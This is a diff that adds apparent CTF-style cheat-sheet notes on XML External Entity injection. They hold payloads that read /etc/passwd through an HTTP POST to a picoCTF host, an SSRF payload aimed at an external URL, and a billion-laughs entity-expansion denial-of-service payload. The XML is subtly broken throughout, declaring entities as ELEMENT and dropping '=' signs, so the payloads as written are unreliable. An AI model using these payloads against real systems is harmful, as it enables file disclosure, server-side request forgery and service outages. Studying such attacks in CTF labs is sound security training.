@@ -1,0 +1,52 @@
+xxe (XML eXternal Entity Injection)
+	--> find a function that"POST"and action  --> 
+		e.g <form class"detailForm" action="/data? method="POST">
+		
+	POST /data HTTP/1.1
+	Host: saturn.picoctf.net:53951
+	Accept: text/plain, */*; q=0.01
+	content-type :text/xml
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	<?xml version"1.0" encoding="utf-8"?>
+	<!DOCTYPE data [
+	<!ELEMENT name ANY>
+	<!ELEMENT xxe SYSTEM "file:///etc/passwd">]>
+	<root>
+	<name>&xxe;</name>
+	</root>
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> F12 --> Network --> data --> payload
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	<?xml version"1.0" encoding="utf-8"?>
+	<!DOCTYPE data [
+	<!ELEMENT file SYSTEM "file:///etc/passwd">]>
+	<data>
+	<ID>&file;</ID>
+	</data>
+	
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+RCE (Remote code Execute) // SSRF(Server-Side request Forgery) 
+	<?xml version"1.0" encoding="utf-8"?>
+	<!DOCTYPE xxe [
+	<!ELEMENT name ANY>
+	<!ELEMENT xxe SYSTEM "http://	.com/?amao=1">]>
+	<root>
+	<name>&xxe;</name>
+	</root>
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+DoS(Denial-of-service)
+	<!DOCTYPE data[
+	<!ELEMENT a0 "dos">
+	<!ELEMENT a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+	<!ELEMENT a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+	<!ELEMENT a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+	<!ELEMENT a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+	]>
+	<data>&a4;</data>
+
+
+
+
